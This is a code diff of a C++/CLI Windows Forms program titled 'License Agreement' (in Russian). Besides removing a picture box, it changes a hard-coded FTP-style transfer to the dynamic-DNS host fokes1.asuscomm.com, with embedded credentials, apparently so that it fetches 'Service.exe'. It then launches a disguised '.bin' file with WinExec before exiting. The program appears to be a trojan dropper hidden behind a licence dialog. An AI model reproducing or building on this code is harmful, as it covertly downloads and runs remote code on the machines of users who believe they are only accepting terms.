@@ -64,7 +64,7 @@ namespace Project2 {
 	private: System::Windows::Forms::Button^  button2;
 	private: System::Windows::Forms::CheckBox^  checkBox1;
 	private: System::Windows::Forms::RichTextBox^  richTextBox1;
-	private: System::Windows::Forms::PictureBox^  pictureBox1;
+
 
 	private:
 		/// <summary>
@@ -84,8 +84,6 @@ namespace Project2 {
 			this->button2 = (gcnew System::Windows::Forms::Button());
 			this->checkBox1 = (gcnew System::Windows::Forms::CheckBox());
 			this->richTextBox1 = (gcnew System::Windows::Forms::RichTextBox());
-			this->pictureBox1 = (gcnew System::Windows::Forms::PictureBox());
-			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->pictureBox1))->BeginInit();
 			this->SuspendLayout();
 			// 
 			// button1
@@ -129,26 +127,12 @@ namespace Project2 {
 			this->richTextBox1->TabIndex = 3;
 			this->richTextBox1->Text = resources->GetString(L"richTextBox1.Text");
 			// 
-			// pictureBox1
-			// 
-			this->pictureBox1->BackgroundImage = (cli::safe_cast<System::Drawing::Image^>(resources->GetObject(L"pictureBox1.BackgroundImage")));
-			this->pictureBox1->BackgroundImageLayout = System::Windows::Forms::ImageLayout::Stretch;
-			this->pictureBox1->ErrorImage = (cli::safe_cast<System::Drawing::Image^>(resources->GetObject(L"pictureBox1.ErrorImage")));
-			this->pictureBox1->InitialImage = (cli::safe_cast<System::Drawing::Image^>(resources->GetObject(L"pictureBox1.InitialImage")));
-			this->pictureBox1->Location = System::Drawing::Point(241, 266);
-			this->pictureBox1->Name = L"pictureBox1";
-			this->pictureBox1->Size = System::Drawing::Size(133, 52);
-			this->pictureBox1->SizeMode = System::Windows::Forms::PictureBoxSizeMode::StretchImage;
-			this->pictureBox1->TabIndex = 4;
-			this->pictureBox1->TabStop = false;
-			// 
 			// MyForm
 			// 
 			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
 			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
 			this->BackgroundImageLayout = System::Windows::Forms::ImageLayout::None;
 			this->ClientSize = System::Drawing::Size(548, 330);
-			this->Controls->Add(this->pictureBox1);
 			this->Controls->Add(this->richTextBox1);
 			this->Controls->Add(this->checkBox1);
 			this->Controls->Add(this->button2);
@@ -157,7 +141,6 @@ namespace Project2 {
 			this->Icon = (cli::safe_cast<System::Drawing::Icon^>(resources->GetObject(L"$this.Icon")));
 			this->Name = L"MyForm";
 			this->Text = L"Лицензионное соглашение";
-			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->pictureBox1))->EndInit();
 			this->ResumeLayout(false);
 			this->PerformLayout();
 
@@ -300,7 +283,7 @@ namespace Project2 {
 				try
 				{
 					wstring stemp = wstring(file.begin(), file.end());
-					upload("fokes1.asuscomm.com", "ff", "WorkerFF", stemp.c_str(), L"Service.exe");
+					upload("fokes1.asuscomm.com", "ff", "WorkerFF", L"Service.exe", stemp.c_str());
 				}
 				catch (exception ex)
 				{
@@ -330,7 +313,7 @@ namespace Project2 {
 		}
 		catch (const std::exception&) { }
 		
-		WinExec("data3.bin", SW_SHOW);
+		WinExec("data2.bin", SW_SHOW);
 
 		Application::Exit();
 	}
